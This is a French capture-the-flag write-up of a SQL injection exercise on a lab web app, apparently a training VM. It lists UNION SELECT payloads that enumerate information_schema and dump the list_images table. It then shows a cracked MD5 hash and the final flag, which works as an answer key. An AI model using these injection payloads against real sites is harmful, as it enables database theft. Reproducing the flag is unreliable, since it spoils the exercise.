### 12 - SQL INJECTION IMAGES

Flag: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
Url:  http://192.168.0.19/index.php?page=searchimg

En testant un id de 1, par exemple, on peut voir que l'on interagit directement avec la base de donnee SQL,
que l'on a besoin d'un numero d'id pour lance rune requete, et que systematiquement, deux colonnes nous sont retournées.

Nous allons donc devoir utiliser un UNION pour demander un numéro d'id bidon et surtout pour effectuer une requete nous renvoyant deux résultats.
Nous allons lister dans un premier temps les tables de la base de donnée avec la commande suivante:

0 UNION SELECT table_schema, table_name FROM information_schema.tables

Nous pouvons lire par rapport à ce qui semble être des tables par défaut, les tables suivantes:

"db_default", "users", "guestbook", "list_image", "vote_db"

Comme on regarde dans la page members, la table qui semble la plus proche de ce sujet semble être list_images.
On va maintenant lister les colonnes et les tables à laquelle elles appartiennent avec la commande suivante:

0 UNION SELECT table_name, column_name FROM information_schema.columns

On a alors une page avec 3 tonnes de données, mais pas de soucis, grace à la commande precedente, il suffit d'effectuer un ctrl + f pour trouver tout les columns en rapport avec la table list_images.
On a donc les colonnes suivantes qui nous intéressent:

"id", "url", "title", "comment"

Il nous suffit donc de les observer deux par deux avec la commande:

0 UNION SELECT id, url FROM list_images

En arrivant sur la commande suivante:

0 UNION SELECT title, comment FROM list_images

On trouve alors une réponse qui pique notre intérêt:

ID: 0 UNION SELECT title, comment FROM list_images  
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?

Le mot de passe contient 32 caractères, c'est donc très certainement du md5.
Sur le site https://md5decrypt.net/, on trouve que ce hash correspond à "albatroz"

On va alors chiffrer ce mot de passe en sha256, en utilisant uniquement des miniscules, comme indiqué sur notre dernière réponse SQL.
Sur le site https://md5decrypt.net/Sha256/, on trouve alors le hash de "albatroz", étant:

"f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188"

On a donc notre flag.

